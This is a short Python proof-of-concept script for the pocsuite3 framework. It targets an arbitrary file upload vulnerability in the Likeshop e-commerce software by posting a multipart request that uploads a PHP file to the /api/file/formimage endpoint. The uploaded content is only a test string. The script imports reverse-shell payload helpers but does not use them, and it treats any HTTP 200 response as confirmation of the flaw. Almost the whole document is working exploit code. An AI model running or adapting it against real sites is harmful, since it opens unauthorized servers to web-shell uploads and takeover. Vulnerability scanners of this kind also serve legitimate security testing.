# _*_ coding:utf-8 _*_
# @Time : 2024/1/25
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class likeshop_upload(POCBase):
    pocDesc = '''Likeshop任意文件上传漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-1-25'
    name = 'Likeshop任意文件上传漏洞'
    #title="Likeshop"

    def _verify(self):

        result = {}
        url = self.url+ '/api/file/formimage'
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
            "Accept": "*/*",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en'
        }
        data='------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name="file";filename="1.php"\r\nContent-Type: application/x-php\r\n\r\ntesttest\r\n------WebKitFormBoundarygcflwtei--'

        try:


            response = requests.post(url,headers=headers,data=data)
            if response.status_code == 200:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(likeshop_upload)
